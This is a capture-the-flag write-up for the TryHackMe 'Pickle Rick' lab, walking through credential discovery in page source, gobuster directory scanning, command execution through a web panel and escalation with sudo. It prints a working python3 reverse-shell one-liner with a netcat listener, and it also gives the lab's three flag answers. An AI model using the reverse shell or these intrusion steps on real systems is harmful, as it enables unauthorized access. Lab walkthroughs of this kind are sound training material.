---
date: "2024-12-15T19:38:31Z"
title: "Pickle Rick"
summary: "Try Hack Me Pickle Rick Box - Difficulty Easy"
---

## Pickle Rick

Here's an overview of the TryHackMe Pickle Rick Challenge:

-   Title: Pickle Rick
-   Difficulty: Easy
-   Summary: This Rick and Morty-themed challenge requires you to exploit a web server
    and find three ingredients to help Rick make his potion and transform himself back into a human from a pickle.

So let's initiate the box and find the ingredients!

## First Ingredient

First we get to the landing page. Analyzing the html we find the username:

<!-- prettier-ignore-start -->
> ```
> <!--
>
> Note to self, remember username!
>
> Username: R1ckRul3s
>
> -->
> ```
{type="secondary"}
<!-- prettier-ignore-end -->

and an `assets/` url that is fetching a rick and morty image. Exploring the `assets` endpoint we encounter
the following files:

-   Files:
    -   bootstrap.min.css
    -   bootstrap.min.js
    -   fail.gif
    -   jquery.min.js
    -   picklerick.gif
    -   portal.jpg
    -   rickandmorty.jpeg

Lets see the common `robots.txt` file:

<!-- prettier-ignore-start -->
> Wubbalubbadubdub
{type="secondary"}
<!-- prettier-ignore-end -->

We find one of Rick's catchphrase.

Lets try to scan for some dirs with the tool `gobuster`. Using the following command:

`gobuster dir -u http://10.10.191.0 --wordlist wordlists/dirbuster/directory-list-2.3-medium.txt -x php,js,html,css,py`

> [!TIP]
> You can get the wordlists from the Kali linux distribution.

The output was the following:

-   /.php (Status: 403) [Size: 276]
-   /.html (Status: 403) [Size: 276]
-   /index.html (Status: 200) [Size: 1062]
-   /login.php (Status: 200) [Size: 882]
-   /assets (Status: 301) [Size: 311] [--> http://10.10.191.0/assets/]
-   /portal.php (Status: 302) [Size: 0] [--> /login.php]

The file `login.php` seems promising. Trying the credentials:

-   Username=R1ckRul3s
-   Password=Wubbalubbadubdub

And we get in on `portal.php`, which has a command input textbox.

Lets try to execute a command. Beginning with `ls .` we get:

-   Sup3rS3cretPickl3Ingred.txt
-   assets
-   clue.txt
-   denied.php
-   index.html
-   login.php
-   portal.php
-   robots.txt

Trying to `cat,head,tail` or even `echo $(<Sup3rS3cretPickl3Ingred.txt)` didn't work. The first because
they are not allowed. And the last didn't respond with any input.

Accessing the file `Sup3rS3cretPickl3Ingred.txt` normally through the url:

<!-- prettier-ignore-start -->
> mr. meeseek hair
{type="primary"}
<!-- prettier-ignore-end -->

Nice we found the first ingredient.

## Second Ingredient

The file `clue.txt` has the content:

<!-- prettier-ignore-start -->
> Look around the file system for the other ingredient.
{type="secondary"}
<!-- prettier-ignore-end -->

and the html on `portal.php` has the base64 string:

`Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0==`

Trying to decode it reveals it is recursive. Using the script:

```python
#!/usr/bin/env python
import subprocess
string = "Vm1wR1UxTnRWa2RUV0d4VFlrZFNjRlV3V2t0alJsWnlWbXQwVkUxV1duaFZNakExVkcxS1NHVkliRmhoTVhCb1ZsWmFWMVpWTVVWaGVqQT0=="

while True:
    try:
        p = subprocess.run(
            ["/usr/bin/bash", "-c", f"echo {string} | base64 -d"],
            capture_output=True,
            text=True,
        )
        string = p.stdout
    except Exception as _:
        break
print(string)
```

outputs:

<!-- prettier-ignore-start -->
> rabbit hole
{type="secondary"}
<!-- prettier-ignore-end -->

Seems that this was mocking us...

Exploring the directory we find the following file in `/home/rick/`:

<!-- prettier-ignore-start -->
> second ingredients
{type="secondary"}
<!-- prettier-ignore-end -->

Using python to print the file contents:
`python3 -c "with open('/home/rick/second ingredients') as f: print(f.read())"`

Shows us:

<!-- prettier-ignore-start -->
> 1 jerry tear
{type="primary"}
<!-- prettier-ignore-end -->

Nice we got the second ingredient! One to go!

## Third Ingredient

Now lets try to use a reverse shell to ease the process. We already know that we have python3 so lets try this payload:

```bash
export RHOST="10.0.0.1";export RPORT=9999;python3 -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

Here `RHOST` should be your TryHackMe VPN IP.
On the my side I listened with:

```bash
nc -lnvp 9999
```

> [!NOTE]
> The `RPORT` should have the same value as the one used in the netcat (`nc`) command.

Then I checked my permission with the command `sudo -l` which showed I had root permissions.

Using the command: `sudo bash` we see a `3rd.txt` in the root directory. Which gives the final ingredient:

<!-- prettier-ignore-start -->
> fleeb juice
{type="primary"}
<!-- prettier-ignore-end -->
